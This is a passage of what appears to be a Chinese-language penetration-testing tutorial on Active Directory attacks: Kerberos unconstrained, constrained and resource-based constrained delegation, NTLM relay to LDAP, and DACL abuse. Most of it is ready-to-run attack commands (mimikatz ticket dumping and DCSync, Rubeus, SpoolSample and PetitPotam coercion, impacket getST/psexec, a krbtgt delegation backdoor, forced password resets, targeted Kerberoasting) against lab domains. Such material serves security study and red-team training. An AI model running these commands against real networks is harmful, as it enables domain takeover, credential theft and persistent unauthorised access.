+AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">"DC=zjun,DC=com"</span> <span class="token parameter variable">-f</span> <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="token parameter variable">-dn</span>
+
+<span class="token comment"># 查询非约束性委派的服务账号</span>
+AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">"DC=zjun,DC=com"</span> <span class="token parameter variable">-f</span> <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="token parameter variable">-dn</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#使用ldapsearch</span>
+ldapsearch <span class="token parameter variable">-LLL</span> <span class="token parameter variable">-x</span> <span class="token parameter variable">-H</span> ldap://172.16.86.136:389 <span class="token parameter variable">-D</span> <span class="token string">"test@zjun.com"</span> <span class="token parameter variable">-w</span> <span class="token string">"P@ssw0rd"</span>   <span class="token parameter variable">-b</span> <span class="token assign-left variable">dc</span><span class="token operator">=</span>zjun,dc<span class="token operator">=</span>com  <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="token parameter variable">-dn</span>
+
+ldapsearch <span class="token parameter variable">-LLL</span> <span class="token parameter variable">-x</span> <span class="token parameter variable">-H</span> ldap://172.16.86.136:389 <span class="token parameter variable">-D</span> <span class="token string">"test@zjun.com"</span> <span class="token parameter variable">-w</span> <span class="token string">"P@ssw0rd"</span>   <span class="token parameter variable">-b</span> <span class="token assign-left variable">dc</span><span class="token operator">=</span>zjun,dc<span class="token operator">=</span>com  <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre>
+
+<p>非约束委派<strong>攻击方式</strong>主要有两种</p>
+<p>1.诱使域管用户（相当于是域内钓鱼）来访问配置了非约束性委派的主机或服务</p>
+<p>2.结合打印机漏洞让域管用户强制回连以缓存 TGT</p>
+<p><strong>攻击一：域管访问委派主机</strong></p>
+<p>模拟域管访问委派主机</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>Win-2008.zjun.com /user:zjun<span class="token punctuation">\</span>administrator P@ssw0rd2019</code></pre>
+
+<p>在内存中找到委派用户的TGT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#mimikatz</span>
+privilege::debug
+sekurlsa::tickets
+sekurlsa::tickets /export
+
+<span class="token comment">#Rebeus</span>
+Rubeus.exe dump /service:krbtgt /nowrap
+Rubeus.exe dump /luid:0xdeadbeef /nowrap
+Rubeus.exe monitor /interval:5</code></pre>
+
+<p>然后ptt就有了域管的权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">kerberos::ptt <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span>7af73<span class="token punctuation">]</span>-2-0-60a10000-Administrator@krbtgt-ZJUN.COM.kirbi</code></pre>
+
+<p><strong>攻击二：非约束委派+Spooler打印机服务漏洞</strong></p>
+<p>利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code> 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
+<p>非约束性委派主机结合 Spooler 打印机服务漏洞，让<code>域控机器 P-DC</code> 强制访问已控的具有本地管理员权限的非约束性委派机器 <code>Win-2008</code> ，从而拿到域管理员的 TGT，进而接管域控。</p>
+<p>首先在非约束委派机器上使用Rubeus监听域控机器</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe monitor /interval:1 /filteruser:P-DC$</code></pre>
+
+<p>然后利用Spooler强制域控打印机回连，需要在域用户的进程上执行，所以随便一个普通域用户即可</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">SpoolSample.exe P-DC Win-2008</code></pre>
+
+<p>之后Rubeus即可获得来自域管的TGT base64形式</p>
+<p>然后导入TGT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe ptt /ticket:Base64EncodedTicket
+
+mimikatz.exe <span class="token string">"log"</span> <span class="token string">"lsadump::dcsync /all /csv"</span> <span class="token string">"exit"</span>  <span class="token comment">#Dcsync获取域内所有用户的NTLM</span>
+
+sekurlsa::tickets /export
+kerberos::ptt <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span>7af73<span class="token punctuation">]</span>-2-0-60a10000-Administrator@krbtgt-ZJUN.COM.kirbi <span class="token comment">#ptt</span></code></pre>
+
+<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a><strong>约束委派</strong></h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-5487096/b012828c3eceb6b299a9f9e7f12adde1.png" alt="img" loading="lazy"></p>
+<p>约束委派与非约束委派的区别在于，用户不会直接把TGT给委派机器，所发送的认证信息中还包含了允许委派访问的服务。</p>
+<p>同时为了在 Kerberos 协议层面对约束性委派的支持， 微软扩展了两个子协议</p>
+<blockquote>
+<ul>
+<li>S4U2Self <code>Service for User to Self</code></li>
+<li>S4U2Proxy <code>Service for User to Proxy</code></li>
+</ul>
+</blockquote>
+<p>计算机用户(<code>JACKSON-PC$</code>) 被配置了约束委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求特定的服务。配置了约束委派用户的userAccountControl 属性有<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>FLAG位（对应十进制16777216）以及<code>msDS-AllowedToDelegateTo</code>属性存储对哪个SPN进行委派。</p>
+<p>正常Kerberos和S4U2Self的区别</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#正常的Kerberos</span>
+用户向KDC的AS申请TGT，然后拿着TGT向KDC申请ST，然后用户拿着ST向服务器请求服务
+
+<span class="token comment">#S4U2Self</span>
+服务器自己向KDC请求TGT，然后服务器代表用户向KDC申请自己服务的ST，然后就可以代表用户访问自己的服务</code></pre>
+
+<p><strong>S4U2Self</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。
+<span class="token number">2</span>.通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。
+<span class="token number">3</span>.KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。
+<span class="token number">4</span>.service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。
+尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</code></pre>
+
+<p><strong>S4U2proxy</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">5</span>.用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。
+<span class="token number">6</span>.service1 以用户的名义向 KDC 请求用户访问 <span class="token function">service</span> <span class="token number">2</span>的 ST2。
+<span class="token number">7</span>.如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。
+<span class="token number">8</span>.service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。
+<span class="token number">9</span>.service2 响应步骤 <span class="token number">8</span> 的请求。
+<span class="token number">10</span>.service1 响应用户对步骤 <span class="token number">5</span> 中的请求</code></pre>
+
+<p>对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的 <code>msDS- AllowedToDelegateTo</code> 属性会指定对哪个 SPN 进行委派。约束性委派的设置需要 SeEnableDelegationPrivilege 权限，该特权通常只有域管理员才有。</p>
+<p>查询约束委派的计算机或服务账户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 导入 PowerView 脚本</span>
+import-module .<span class="token punctuation">\</span>PowerView.ps1
+
+<span class="token comment"># 查询域内约束性委派的计算机</span>
+Get-DomainComputer <span class="token parameter variable">-TrustedToAuth</span> <span class="token parameter variable">-Domain</span> zjun.com <span class="token parameter variable">-Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto <span class="token operator">|</span> fl
+
+<span class="token comment"># 查询域内非约束性委派的服务账号</span>
+Get-DomainUser <span class="token parameter variable">-TrustedToAuth</span> <span class="token parameter variable">-Domain</span> zjun.com <span class="token parameter variable">-Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto <span class="token operator">|</span> fl
+
+<span class="token comment">#在域外</span>
+findDelegation.py domain.local/username:password -target-domain domain.local</code></pre>
+
+<p>或者使用Adfind或ldapsearch</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查询域内约束性委派的计算机</span>
+AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">"DC=zjun,DC=com"</span> <span class="token parameter variable">-f</span> <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> <span class="token parameter variable">-dn</span>
+
+<span class="token comment"># 查询非束性委派的服务账号</span>
+AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">"DC=zjun,DC=com"</span> <span class="token parameter variable">-f</span> <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> <span class="token parameter variable">-dn</span>
+
+<span class="token comment">#ldapsearch</span>
+<span class="token comment"># 查询域内约束性委派的计算机</span>
+ldapsearch <span class="token parameter variable">-x</span> <span class="token parameter variable">-H</span> ldap://172.16.86.136:389 <span class="token parameter variable">-D</span> <span class="token string">"test@zjun.com"</span> <span class="token parameter variable">-w</span> <span class="token string">"P@ssw0rd"</span> <span class="token parameter variable">-b</span> <span class="token assign-left variable">dc</span><span class="token operator">=</span>zjun,dc<span class="token operator">=</span>com <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-iE</span> <span class="token string">"distinguishedName|allowedtodelegateto"</span>
+
+<span class="token comment"># 查询非束性委派的服务账号</span>
+ldapsearch <span class="token parameter variable">-x</span> <span class="token parameter variable">-H</span> ldap://172.16.86.136:389 <span class="token parameter variable">-D</span> <span class="token string">"test@zjun.com"</span> <span class="token parameter variable">-w</span> <span class="token string">"P@ssw0rd"</span> <span class="token parameter variable">-b</span> <span class="token assign-left variable">dc</span><span class="token operator">=</span>zjun,dc<span class="token operator">=</span>com <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-iE</span> <span class="token string">"distinguishedName|allowedtodelegateto"</span></code></pre>
+
+<p><strong>约束委派的攻击</strong></p>
+<p>服务用户只能获取某个用户（或主机）的服务的 ST，所以只能模拟用户访问特定的服务，是无法获取用户的 TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者 <code>NTLM Hash</code> ，我们就可以伪造 S4U 请求，进而伪装成服务用户以任意账户的权限申请访问指定服务的 ST。</p>
+<p>已经知道服务用户明文的条件下，我们可以用<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">kekeo</a>请求该用户的 TGT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># kekeo</span>
+tgt::ask /user:test /domain:zjun.com /password:P@ssw0rd
+
+<span class="token comment"># 得到服务用户 test 的 TGT: TGT_test@ZJUN.COM_krbtgt~zjun.com@ZJUN.COM.kirbi</span>
+<span class="token comment"># kekeo</span>
+tgt::ask /user:test /domain:zjun.com /NTLM:e19ccf75ee54e06b06a5907af13cef42 <span class="token comment">#或者使用NTLM</span></code></pre>
+
+<p>使用这张 TGT 通过伪造 S4U 请求以 <code>administrator</code> 用户身份请求访问 <code>P-DC CIFS</code> 的 ST</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># kekeo</span>
+tgs::s4u /tgt:TGT_test@ZJUN.COM_krbtgt~zjun.com@ZJUN.COM.kirbi /user:Administrator@zjun.com /service:cifs/P-DC.zjun.com
+
+<span class="token comment"># S4U2self 的 ST1: TGS_Administrator@zjun.com@ZJUN.COM_test@ZJUN.COM.kirbi</span>
+<span class="token comment"># S4U2proxy 的 ST2: TGS_Administrator@zjun.com@ZJUN.COM_cifs~P-DC.zjun.com@ZJUN.COM.kirbi</span></code></pre>
+
+<p>用 mimikatz 将 ST2 导入当前会话，即可成功访问域控 <code>P-DC</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># mimikatz</span>
+kerberos::ptt TGS_Administrator@zjun.com@ZJUN.COM_cifs~P-DC.zjun.com@ZJUN.COM.kirbi</code></pre>
+
+<p>如果不知道服务用户的明文和 NTLM Hash，但是已有服务用户登陆的主机的本地管理员权限，可以用 mimikatz 直接从内存中把服务用户的 TGT 导出</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::tickets /export"</span> <span class="token builtin class-name">exit</span>
+
+<span class="token comment"># kekeo</span>
+tgs::s4u /tgt:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span>8f613<span class="token punctuation">]</span>-2-0-40e10000-test@krbtgt-ZJUN.COM.kirbi /user:Administrator@zjun.com /service:cifs/P-DC.zjun.com
+</code></pre>
+
+<p>或者直接rubeus</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe tgtdeleg <span class="token comment">#拿到服务账户的TGT</span>
+Rubeus.exe s4u /ticket:BASE64 /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt <span class="token comment">#请求域控的CIFS</span></code></pre>
+
+
+
+<p><strong>在linux上操作</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">getST.py <span class="token parameter variable">-spn</span> <span class="token string">'CIFS/winterfell'</span> <span class="token parameter variable">-impersonate</span> Administrator -dc-ip <span class="token string">'192.168.56.11'</span> <span class="token string">'north.sevenkingdoms.local/jon.snow:iknownothing'</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>./Administrator.ccache
+secretsdump.py <span class="token parameter variable">-k</span> -no-pass north.sevenkingdoms.local/administrator@winterfell -just-dc-ntlm
+<span class="token comment">#或者直接登录域控</span>
+wmiexec.py <span class="token parameter variable">-k</span> -no-pass north.sevenkingdoms.local/administrator@winterfell</code></pre>
+
+<h3 id="基于资源的约束委派-RBCD"><a href="#基于资源的约束委派-RBCD" class="headerlink" title="基于资源的约束委派(RBCD)"></a><strong>基于资源的约束委派(RBCD)</strong></h3><p>如果约束性委派，必须拥有 <code>SeEnableDelegationPrivilege</code> 权限，该特权是敏感的，通常仅授予域管理员。为了使用户&#x2F;资源更加独立，Windows Server 2012 中引入了基于资源的约束委派。基于资源的约束性委派不需要域管理员权限去设置，而是把设置属性的权限赋予给了机器自身。</p>
+<p>基于资源的约束委派只能在运行 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器上配置，<strong>但资源的约束委派可以跨域森林和跨域。</strong></p>
+<p>配置了基于资源的约束委派的账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的值为被允许基于资源约束性委派的账号的SID。</p>
+<p>基于资源的约束委派与传统约束委派非常相似但配置相反。服务1到服务2的约束委派在服务1账户的<code>msDS-AllowedToDelegateTo</code>属性中配置，定义从服务1到服务2的”传出”信任。而基于资源的约束委派是在服务2的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性中配置，定义从服务1到服务2的”传入”信任。所以只要拥有服务2的权限就可以配置服务2的基于资源的约束委派。</p>
+<p>配置 RBCD 的关键在于 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 通常以下用户能够修改此属性</p>
+<ul>
+<li>将主机加入域的用户 (机器账户中会有一个 msDS-CreatorSID 属性, 使用非域管账户加入域时才会显示)</li>
+<li>Account Operators (能修改任意域内非域控机器的委派属性)</li>
+<li>NT AUTHORITY\SELF (该主机的机器账户)</li>
+</ul>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250726202824014.png" alt="image-20250726202824014" loading="lazy"></p>
+<p><strong>常规利用</strong></p>
+<p>一般的情况是我们拿到一个域内的普通用户, 并且发现某台机器是通过该用户加入域的, 那么就可以通过 RBCD 在该机器上实现本地提权</p>
+<p>思路:</p>
+<ol>
+<li>利用可控域用户创建一个机器账户 (每个域用户默认可以创建 10 个机器账户, 即 <code>msDS-MachineAccountQuota (MAQ)</code> 属性)</li>
+<li>修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 使其指向新创建机器账户的 SID</li>
+<li>利用该机器账户的凭证通过 S4U 协议申请委派至目标主机的 ST 票据, 实现本地提权&#x2F;横向移动</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#添加一个机器账户</span>
+addcomputer.py -computer-name <span class="token string">'rbcd$'</span> -computer-pass <span class="token string">'rbcdpass'</span> -dc-ip <span class="token number">192.168</span>.56.10 sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
+
+<span class="token comment">#添加委派权限</span>
+rbcd.py -delegate-from <span class="token string">'rbcd$'</span> -delegate-to <span class="token string">'kingslanding$'</span> -dc-ip <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-action</span> <span class="token string">'write'</span> sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
+
+<span class="token comment">#请求server2的ST</span>
+getST.py <span class="token parameter variable">-spn</span> <span class="token string">'cifs/kingslanding.sevenkingdoms.local'</span> <span class="token parameter variable">-impersonate</span> Administrator -dc-ip <span class="token number">192.168</span>.56.10 <span class="token string">'sevenkingdoms.local/rbcd$:rbcdpass'</span>
+
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>Administrator.ccache
+wmiexec.py <span class="token parameter variable">-k</span> -no-pass kingslanding.sevenkingdoms.local</code></pre>
+
+<p>在windows上操作</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#导入powermad，powerview</span>
+Set-ExecutionPolicy Bypass <span class="token parameter variable">-Scope</span> Process
+<span class="token builtin class-name">.</span> .<span class="token punctuation">\</span>Powermad.ps1
+<span class="token builtin class-name">.</span> .<span class="token punctuation">\</span>powerview.ps1
+<span class="token comment">#添加机器账户</span>
+New-MachineAccount <span class="token parameter variable">-MachineAccount</span> test1 <span class="token parameter variable">-Password</span> <span class="token variable"><span class="token variable">$(</span>ConvertTo-SecureString <span class="token string">"123456"</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span><span class="token variable">)</span></span>
+<span class="token comment">#获取该机器账户的SID</span>
+Get-NetComputer test1 <span class="token parameter variable">-Properties</span> objectsid
+<span class="token comment">#配置server2(FILESERVER)的msds-allowedtoactonbehalfofotheridentity</span>
+<span class="token variable">$SD</span> <span class="token operator">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="token parameter variable">-ArgumentList</span> <span class="token string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1117)"</span>
+
+<span class="token variable">$SDBytes</span> <span class="token operator">=</span> New-Object byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token variable">$SD</span>.BinaryLength<span class="token punctuation">)</span>
+<span class="token variable">$SD</span>.GetBinaryForm<span class="token punctuation">(</span><span class="token variable">$SDBytes</span>, <span class="token number">0</span><span class="token punctuation">)</span>
+Get-DomainComputer FILESERVER <span class="token operator">|</span> Set-DomainObject <span class="token parameter variable">-Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'msds-allowedtoactonbehalfofotheridentity'</span><span class="token operator">=</span><span class="token variable">$SDBytes</span><span class="token punctuation">&#125;</span> <span class="token parameter variable">-Verbose</span>
+
+<span class="token comment">#获取SERVER2的ST</span>
+getST.py -dc-ip <span class="token number">172.22</span>.60.8 xiaorang.lab/test1<span class="token punctuation">\</span>$:123456 <span class="token parameter variable">-spn</span> cifs/Fileserver.xiaorang.lab <span class="token parameter variable">-impersonate</span> administrator
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache
+psexec.py Administrator@FILESERVER.xiaorang.lab <span class="token parameter variable">-k</span> -no-pass -dc-ip <span class="token number">172.22</span>.60.8</code></pre>
+
+
+
+<p><strong>服务账户提权</strong></p>
+<p>原理: IIS, MSSQL, Network Service 等服务账户出网时使用的是本机的<strong>机器账户</strong>, 访问域内资源时能够以机器账户的身份修改自身的委派属性, 从而提升至本地管理员权限</p>
+<p>利用 SharpAllowedToAct</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pkb1s/SharpAllowedToAct">https://github.com/pkb1s/SharpAllowedToAct</a></p>
+<p>先利用当前用户的身份创建机器账户并配置委派属性</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>inetpub<span class="token punctuation">\</span>wwwroot<span class="token punctuation">\</span>SharpAllowedToAct.exe <span class="token parameter variable">-m</span> TEST <span class="token parameter variable">-p</span> <span class="token number">123456</span> <span class="token parameter variable">-t</span> WIN2008-WEB</code></pre>
+
+<p><strong>RBCD后门</strong></p>
+<p>利用 RBCD, 设置 krbtgt 服务的委派属性为指定后门账户, 从而打造变种黄金票据</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">addcomputer.py hack-my.com/Alice:<span class="token string">'Alice123!'</span> -computer-name TEST<span class="token punctuation">\</span>$ -computer-pass <span class="token number">123456</span> -dc-host DC.hack-my.com -dc-ip <span class="token number">192.168</span>.30.10</code></pre>
+
+<p>在域控上执行如下命令, 配置 krbtgt 的委派属性</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Set-ADUser krbtgt <span class="token parameter variable">-PrincipalsAllowedToDelegateToAccount</span> test$</code></pre>
+
+<p>最后申请ST</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">getST.py hack-my.com/test<span class="token punctuation">\</span>$:123456 <span class="token parameter variable">-spn</span> krbtgt <span class="token parameter variable">-impersonate</span> administrator -dc-ip <span class="token number">192.168</span>.30.10
+
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache
+psexec.py <span class="token parameter variable">-k</span> -no-pass administrator@DC.hack-my.com -dc-ip <span class="token number">192.168</span>.30.10</code></pre>
+
+<p>可以连接到域内的任何一台机器</p>
+<p><strong>NTLM Relay to LDAP</strong></p>
+<p>NTLM Relay 经常会结合 RBCD 一起利用, 后者作为中继至 LDAP 的一种利用手段, 当然也还有其它的利用方式, 比如配合 Exchange 机器账户写 DCSync 权限, 利用 Shadow Credentials 等等</p>
+<p>下面简要介绍利用 SMB, HTTP, WebDAV 协议进行 NTLM Relay to LDAP 并配置 RBCD 实现本地提权&#x2F;横向移动</p>
+<p><strong>1.SMB</strong></p>
+<p>默认情况下, LDAP 的签名策略为协商签名 (是否签名由客户端决定), 当使用 SMB 协议发起 LDAP 请求时, 就会要求 LDAP 服务器对 NTLM 认证请求强制签名, 所以一般来说无法通过 SMB 协议进行 NTLM Relay to LDAP</p>
+<p>但是 2019 年爆出了 CVE-2019-1040 漏洞, 它能够绕过 NTLM MIC 的防护机制, 修改 NTLM 请求中的某些标志位, 使得客户端对于 SMB 发起的 LDAP 请求不要求签名, 从而实现 NTLM Relay</p>
+<p>结合强制认证 (例如 SpoolSample, PetitPotam) 配合 RBCD 可以实现横向移动</p>
+<p>首先添加机器账户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">addcomputer.py hack-my.com/Alice:<span class="token string">'Alice123!'</span> -computer-name TEST<span class="token punctuation">\</span>$ -computer-pass <span class="token number">123456</span> -dc-host DC.hack-my.com -dc-ip <span class="token number">192.168</span>.30.10</code></pre>
+
+<p>启动 ntlmrelayx, 注意设置 <code>--remove-mic</code> 选项</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ntlmrelayx.py <span class="token parameter variable">-t</span> ldap://192.168.30.10 --remove-mic --delegate-access --escalate-user <span class="token string">'TEST$'</span></code></pre>
+
+<p>利用 PetitPotam 发起对恶意机器的 SMB 请求</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python3 PetitPotam.py <span class="token parameter variable">-d</span> hack-my.com <span class="token parameter variable">-u</span> Alice <span class="token parameter variable">-p</span> <span class="token string">'Alice123!'</span> <span class="token number">192.168</span>.30.40 <span class="token number">192.168</span>.30.20</code></pre>
+
+<p>最后申请 ST</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">getST.py hack-my.com/test<span class="token punctuation">\</span>$:123456 <span class="token parameter variable">-spn</span> cifs/WIN7-CLIENT.hack-my.com <span class="token parameter variable">-impersonate</span> administrator -dc-ip <span class="token number">192.168</span>.30.10
+
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache
+psexec.py <span class="token parameter variable">-k</span> -no-pass administrator@WIN7-CLIENT.hack-my.com -dc-ip <span class="token number">192.168</span>.30.10</code></pre>
+
+
+
+<h2 id="DACL滥用"><a href="#DACL滥用" class="headerlink" title="DACL滥用"></a><strong>DACL滥用</strong></h2><h3 id="GenericALL"><a href="#GenericALL" class="headerlink" title="GenericALL"></a><strong>GenericALL</strong></h3><p><strong>TO User</strong></p>
+<p><strong>修改密码</strong></p>
+<p>如果某个用户对另一个用户有genericall权限，那么可以修改他的密码,比如说</p>
+<p>用户aaa@hackme对用户b@hackme具有 GenericAll 权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net user b@hackme 123456qwE /domain
+bloodyAD <span class="token parameter variable">--host</span> <span class="token string">"dc01.infiltrator.htb"</span> <span class="token parameter variable">-d</span> <span class="token string">"hackme.htb"</span> <span class="token parameter variable">--kerberos</span> <span class="token parameter variable">-u</span> <span class="token string">"aaa"</span> <span class="token parameter variable">-p</span> <span class="token string">'Password123'</span> <span class="token builtin class-name">set</span> password <span class="token string">"bbb"</span> <span class="token string">'Password123'</span>
+
+<span class="token comment">#或者启用一个受限的用户</span>
+bloodyAD <span class="token parameter variable">--host</span> <span class="token string">"puppy.htb"</span> <span class="token parameter variable">-d</span> <span class="token string">"puppy.htb"</span> <span class="token parameter variable">-u</span> <span class="token string">"ant.edwards"</span> <span class="token parameter variable">-p</span> <span class="token string">'Antman2025!'</span> remove uac adam.silver <span class="token parameter variable">-f</span> ACCOUNTDISABLE</code></pre>
+
+<p><strong>Targeted Kerberoasting</strong></p>
+<p>给用户分配SPN将其设置成Service，然后打Kerberoasting攻击</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">powerview<span class="token operator"><span class="token file-descriptor important">2</span>></span>  Set-DomainObject <span class="token parameter variable">-Credential</span> <span class="token variable">$creds</span> <span class="token parameter variable">-Identity</span> <span class="token operator">&lt;</span>username<span class="token operator">></span> <span class="token parameter variable">-Set</span> @<span class="token punctuation">&#123;</span>serviceprincipalname<span class="token operator">=</span><span class="token string">"fake/NOTHING"</span><span class="token punctuation">&#125;</span>
+rubeus kerberoast攻击
+.<span class="token punctuation">\</span>Rubeus.exe kerberoast /user:<span class="token operator">&lt;</span>username<span class="token operator">></span> /nowrap</code></pre>
+
+<p><strong>Targeted AS-REP Roasting</strong></p>
+<p>禁用用户的预身份验证，使其帐户容易受到 AS-REP Roasting攻击</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Set-DomainObject <span class="token parameter variable">-Identity</span> <span class="token operator">&lt;</span>username<span class="token operator">></span> <span class="token parameter variable">-XOR</span> @<span class="token punctuation">&#123;</span>UserAccountControl<span class="token operator">=</span><span class="token number">4194304</span><span class="token punctuation">&#125;</span>
+GetNPUsers.py <span class="token parameter variable">-usersfile</span> user.txt -no-pass -dc-ip <span class="token number">192.168</span>.10.5 DORAEMON.THL/   </code></pre>
+
+<p><strong>TO Group</strong></p>
+<p>将自己加入这个组</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net group sales rto /add /doamin</code></pre>
+
+<p><strong>TO Computer</strong></p>
+<p>读取LAPS密码</p>
+<p><strong>执行基于资源的约束委派攻击</strong></p>
+<p>有GenericALL权限就能修改机器用户的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性进行RBCD攻击</p>
+<h3 id="GeneriaWrite"><a href="#GeneriaWrite" class="headerlink" title="GeneriaWrite"></a><strong>GeneriaWrite</strong></h3><p><strong>TO User</strong></p>
+<p><strong>Targeted Kerberoasting</strong></p>
+<p>同GenericALL</p>
+<p><strong>修改密码</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">bloodyAD.py <span class="token parameter variable">--host</span> <span class="token punctuation">[</span>DC IP<span class="token punctuation">]</span> <span class="token parameter variable">-d</span> DOMAIN <span class="token parameter variable">-u</span> attacker_user <span class="token parameter variable">-p</span> :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd</code></pre>
+
+<p><strong>TO Group</strong></p>
+<p>将用户添加到组</p>
+<p>同genericall</p>
